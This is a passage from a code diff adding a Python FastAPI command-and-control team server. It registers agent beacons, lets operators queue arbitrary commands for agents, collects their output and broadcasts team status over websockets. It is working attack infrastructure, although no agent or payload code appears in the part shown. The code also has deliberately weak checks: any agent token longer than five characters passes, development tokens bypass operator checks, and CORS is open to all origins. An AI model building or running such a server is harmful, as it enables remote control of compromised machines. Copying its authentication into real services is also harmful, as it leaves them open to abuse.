+                    ],
+                    "timestamp": self._now_iso()
+                }
+            }
+
+        # Simple endpoints
+        @self.app.post("/api/v1/simple_beacon")
+        async def simple_beacon(agent_id: str, hostname: str, encrypted: bool = False):
+            try:
+                # WRITE operation
+                await self._execute_write("""
+                    INSERT OR REPLACE INTO agents (id, hostname, encrypted, last_seen, status)
+                    VALUES (?, ?, ?, ?, ?)
+                """, (agent_id, hostname, int(encrypted), self._now_iso(), "online"))
+
+                self._update_session(agent_id, "0.0.0.0", "simple_beacon")
+                return {"status": "success", "agent_id": agent_id}
+            except Exception as e:
+                logger.error(f"Simple beacon error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/simple_task")
+        async def simple_task(agent_id: str, command: str, args: list = None, operator_id: str = "operator-01"):
+            try:
+                if args is None:
+                    args = []
+
+                task_id = str(uuid.uuid4())
+
+                # WRITE operation
+                await self._execute_write("""
+                    INSERT INTO tasks (id, agent_id, command, args, operator_id, created_at, status)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)
+                """, (task_id, agent_id, command, json.dumps(args), operator_id, self._now_iso(), "pending"))
+
+                return {"task_id": task_id, "status": "queued"}
+            except Exception as e:
+                logger.error(f"Simple task error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/simple_result")
+        async def simple_result(agent_id: str, task_id: str, output: str, exit_code: int = 0):
+            try:
+                # WRITE operation
+                await self._execute_write("""
+                    UPDATE tasks
+                    SET result = ?, exit_code = ?, status = 'completed', executed_at = ?
+                    WHERE id = ? AND agent_id = ?
+                """, (output[:1000000], exit_code, self._now_iso(), task_id, agent_id))
+
+                return {"status": "success", "task_id": task_id}
+            except Exception as e:
+                logger.error(f"Simple result error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+    # -------------------
+    # Core C2 Functions
+    # -------------------
+    async def _get_pending_tasks_async(self, agent_id: str) -> List[Dict]:
+        loop = asyncio.get_event_loop()
+        tasks = await loop.run_in_executor(
+            None,
+            self._sync_get_pending_tasks,
+            agent_id
+        )
+        return tasks
+
+    def _sync_get_pending_tasks(self, agent_id: str) -> List[Dict]:
+        conn = None
+        try:
+            conn = self.get_db()
+            c = conn.cursor()
+
+            # READ ONLY - Get pending tasks
+            c.execute("""
+                SELECT id, command, args, operator_id, created_at
+                FROM tasks
+                WHERE agent_id = ? AND status = 'pending'
+                ORDER BY priority DESC, created_at ASC
+                LIMIT 10
+            """, (agent_id,))
+
+            rows = c.fetchall()
+            tasks = []
+            task_ids = []
+
+            for row in rows:
+                task_id = row[0]
+                command = row[1]
+                args_json = row[2]
+                operator_id = row[3]
+                created_at = row[4]
+
+                args = json.loads(args_json) if args_json else []
+                tasks.append({
+                    "task_id": task_id,
+                    "command": command,
+                    "args": args,
+                    "operator_id": operator_id,
+                    "created_at": created_at
+                })
+                task_ids.append(task_id)
+
+            conn.close()
+            conn = None
+
+            # WRITE OPERATION - Update task status (SEPARATE CONNECTION)
+            if task_ids:
+                write_conn = self.get_db()
+                write_c = write_conn.cursor()
+                for task_id in task_ids:
+                    write_c.execute("UPDATE tasks SET status = 'dispatched' WHERE id = ?", (task_id,))
+                write_conn.commit()
+                write_conn.close()
+
+            return tasks
+
+        except Exception as e:
+            logger.error(f"Error getting pending tasks: {e}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+
+    def _update_session(self, agent_id: str, ip: str, status: str = "active"):
+        self.active_sessions[agent_id] = {
+            "last_seen": self._now_iso(),
+            "ip": ip,
+            "status": status,
+            "agent_id": agent_id
+        }
+
+    def _cleanup_inactive_sessions(self):
+        cutoff = self._now() - timedelta(minutes=3)
+        for agent_id, session in list(self.active_sessions.items()):
+            last_seen_str = session.get("last_seen")
+            if last_seen_str:
+                try:
+                    last_seen = self._parse_iso(last_seen_str)
+                    if last_seen < cutoff:
+                        session["status"] = "offline"
+                        if last_seen < self._now() - timedelta(hours=24):
+                            if agent_id in self.agent_keys:
+                                del self.agent_keys[agent_id]
+                except Exception as e:
+                    logger.error(f"Error parsing session timestamp: {e}")
+
+    # -------------------
+    # WebSocket Endpoints
+    # -------------------
+    def _setup_websocket(self):
+        @self.app.websocket("/ws")
+        async def websocket_endpoint(websocket: WebSocket):
+            await websocket.accept()
+            self.websocket_connections.append(websocket)
+            try:
+                while True:
+                    msg = await websocket.receive_text()
+                    await websocket.send_text(f"ACK: {msg}")
+            except WebSocketDisconnect:
+                self._remove_websocket(websocket)
+            except Exception as e:
+                logger.error(f"WebSocket error: {e}")
+                self._remove_websocket(websocket)
+
+    def _setup_team_websocket(self):
+        @self.app.websocket("/ws/team")
+        async def team_websocket(websocket: WebSocket):
+            await websocket.accept()
+            self.websocket_connections.append(websocket)
+            try:
+                initial_state = await self._get_team_state()
+                await websocket.send_json({
+                    'type': 'initial_state',
+                    'data': initial_state
+                })
+                while True:
+                    try:
+                        data = await websocket.receive_json()
+                        if data.get('type') == 'ping':
+                            await websocket.send_json({'type': 'pong'})
+                        elif data.get('type') == 'get_state':
+                            state = await self._get_team_state()
+                            await websocket.send_json({
+                                'type': 'state_update',
+                                'data': state
+                            })
+                    except WebSocketDisconnect:
+                        break
+            except Exception as e:
+                logger.error(f"Team WebSocket error: {e}")
+            finally:
+                self._remove_websocket(websocket)
+
+    def _remove_websocket(self, websocket: WebSocket):
+        try:
+            if websocket in self.websocket_connections:
+                self.websocket_connections.remove(websocket)
+        except:
+            pass
+
+    async def _broadcast_to_team(self, message: Dict):
+        dead_connections = []
+        for connection in self.websocket_connections:
+            try:
+                await connection.send_json(message)
+            except Exception as e:
+                logger.error(f"Broadcast error: {e}")
+                dead_connections.append(connection)
+        for connection in dead_connections:
+            self._remove_websocket(connection)
+
+    async def _broadcast_status_updates(self):
+        while not self.is_shutting_down:
+            await asyncio.sleep(30)
+            try:
+                state = await self._get_team_state()
+                await self._broadcast_to_team({
+                    'type': 'status_update',
+                    'data': state
+                })
+            except Exception as e:
+                logger.error(f"Status broadcast error: {e}")
+
+    async def _get_team_state(self) -> Dict:
+        # READ operation - no lock needed
+        conn = self.get_db()
+        c = conn.cursor()
+        try:
+            c.execute("SELECT COUNT(*) FROM agents")
+            total_agents = c.fetchone()[0] or 0
+            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'pending' OR status = 'dispatched'")
+            pending_tasks = c.fetchone()[0] or 0
+            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'")
+            completed_tasks = c.fetchone()[0] or 0
+            c.execute("SELECT COUNT(*) FROM operators WHERE is_active = 1")
+            active_operators = c.fetchone()[0] or 1
+        except Exception as e:
+            logger.error(f"Error getting team state: {e}")
+            total_agents = 0
+            pending_tasks = 0
+            completed_tasks = 0
+            active_operators = 1
+        conn.close()
+
+        return {
+            'server_id': self.server_id,
+            'timestamp': self._now_iso(),
+            'total_agents': total_agents,
+            'online_agents': len([s for s in self.active_sessions.values() if s.get('status') in ['active', 'registered']]),
+            'pending_tasks': pending_tasks,
+            'completed_tasks': completed_tasks,
+            'active_operators': active_operators,
+            'websocket_connections': len(self.websocket_connections),
+            'active_sessions': len(self.active_sessions)
+        }
+
+    # -------------------
+    # Background Tasks
+    # -------------------
+    async def _cleanup_old_sessions_loop(self):
+        while not self.is_shutting_down:
+            await asyncio.sleep(60)
+            try:
+                self._cleanup_inactive_sessions()
+            except Exception as e:
+                logger.error(f"Error cleaning up sessions: {e}")
+
+    async def _update_agent_status_loop(self):
+        while not self.is_shutting_down:
+            await asyncio.sleep(30)
+            try:
+                await self._execute_write("""
+                    UPDATE agents
+                    SET status = 'offline'
+                    WHERE last_seen < ?
+                """, ((self._now() - timedelta(minutes=2)).isoformat(),))
+            except Exception as e:
+                logger.error(f"Error updating agent status: {e}")
+
+    async def _cleanup_old_tasks_loop(self):
+        while not self.is_shutting_down:
+            await asyncio.sleep(3600)
+            try:
+                await self._execute_write("""
+                    DELETE FROM tasks
+                    WHERE status = 'completed' AND executed_at < ?
+                """, ((self._now() - timedelta(hours=24)).isoformat(),))
+
+                await self._execute_write("""
+                    DELETE FROM tasks
+                    WHERE status = 'failed' AND executed_at < ?
+                """, ((self._now() - timedelta(hours=12)).isoformat(),))
+
+                logger.info("Cleaned up old tasks")
+            except Exception as e:
+                logger.error(f"Error cleaning up old tasks: {e}")
+
+    # -------------------
+    # Security and Authentication
+    # -------------------
+    def _verify_operator_token(self, token: str) -> bool:
+        if token in DEV_TOKENS:
+            return True
+        # READ operation - no lock needed
+        conn = self.get_db()
+        c = conn.cursor()
+        try:
+            c.execute("SELECT COUNT(*) FROM operators WHERE id = ? AND is_active = 1", (token,))
+            count = c.fetchone()[0]
+            conn.close()
+            return count > 0
+        except:
+            conn.close()
+            return False
+
+    def _verify_agent_token(self, token: str) -> bool:
+        return bool(token) and len(token) > 5
+
+    # -------------------
+    # Middleware Setup
+    # -------------------
+    def _setup_middleware(self):
+        self.app.add_middleware(
+            CORSMiddleware,
+            allow_origins=["*"],
+            allow_credentials=True,
+            allow_methods=["*"],
+            allow_headers=["*"],
+        )
+
+
+# Create a global app instance for uvicorn to find
+_server_instance = None
+
+def get_app():
+    """Create and return the FastAPI app instance"""
+    global _server_instance
+    if _server_instance is None:
+        config = {
+            "database_path": "teamserver.db",
+            "alternate_endpoints": [
+                "http://localhost:8443",
+                "https://localhost:9443"
+            ]
+        }
+        _server_instance = InternalC2Server("C2-TeamServer-01", config)
+    return _server_instance.app
+
+# This is what uvicorn will look for - a module-level 'app' variable
+app = get_app()
+
+
+def main():
+    """Main entry point - for running directly with python"""
+    config = {
+        "database_path": "teamserver.db",
+        "alternate_endpoints": [
+            "http://localhost:8443",
+            "https://localhost:9443"
+        ]
+    }
+
+    server = InternalC2Server("C2-TeamServer-01", config)
+    server.start(host="0.0.0.0", port=8443)
+
+
+if __name__ == "__main__":
+    main()
